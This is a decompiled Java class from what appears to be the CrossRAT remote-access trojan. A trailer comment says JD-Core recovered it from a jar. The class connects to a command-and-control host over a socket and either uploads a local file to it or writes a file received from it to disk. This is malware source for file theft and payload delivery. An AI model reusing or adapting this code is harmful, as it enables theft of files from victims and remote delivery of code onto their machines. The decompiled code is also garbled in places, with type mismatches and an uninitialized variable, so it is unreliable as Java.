package crossrat;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.net.Socket;

public final class d
  extends Thread
{
  private Socket a;
  private String b;
  private int c;
  private String d;
  private String e;
  private String f;
  private String g;
  
  public d(String paramString1, int paramInt, String paramString2, String paramString3, String paramString4, String paramString5)
  {
    this.b = paramString1;
    this.c = paramInt;
    this.f = paramString4;
    this.e = paramString3;
    this.d = paramString2;
    this.g = paramString5;
  }
  
  private void a(String paramString1, String paramString2, String paramString3)
  {
    DataOutputStream localDataOutputStream = new DataOutputStream(this.a.getOutputStream());
    paramString1 = new FileInputStream(paramString1);
    localDataOutputStream.writeBytes(k.g + k.d + k.G + k.d + paramString2 + k.d + paramString3 + k.d + "&&&");
    try
    {
      Thread.sleep(2000L);
    }
    catch (Exception localException)
    {
      (paramString2 = localException).printStackTrace();
    }
    paramString2 = new byte['ࠀ'];
    while (paramString1.read(paramString2) > 0) {
      localDataOutputStream.write(paramString2);
    }
    paramString1.close();
    localDataOutputStream.close();
  }
  
  private void b(String paramString1, String paramString2, String paramString3)
  {
    DataInputStream localDataInputStream = new DataInputStream(this.a.getInputStream());
    paramString1 = new FileOutputStream(paramString1);
    DataOutputStream localDataOutputStream;
    (localDataOutputStream = new DataOutputStream(this.a.getOutputStream())).writeBytes(k.g + k.d + k.H + k.d + paramString2 + k.d + paramString3 + k.d + "&&&");
    try
    {
      Thread.sleep(2000L);
    }
    catch (Exception localException)
    {
      (paramString2 = localException).printStackTrace();
    }
    paramString2 = new byte['ࠀ'];
    String str = paramString3 = Integer.parseInt(paramString3);
    int i;
    while ((paramString3 = localDataInputStream.read(paramString2, 0, Math.min(2048, i))) > 0)
    {
      str -= paramString3;
      paramString1.write(paramString2, 0, paramString3);
    }
    paramString1.close();
    localDataInputStream.close();
  }
  
  public final void run()
  {
    try
    {
      this.a = new Socket(this.b, this.c);
      if (this.g == "0") {
        a(this.d, this.e, this.f);
      }
      if (this.g == "1")
      {
        b(this.d, this.e, this.f);
        return;
      }
    }
    catch (Exception localException2)
    {
      Exception localException1;
      (localException1 = localException2).printStackTrace();
    }
  }
}


/* Location:              C:\Users\sihadan\Desktop\CrossRAT\CrossRAT\CrossRat\hmar6.jar!\crossrat\d.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */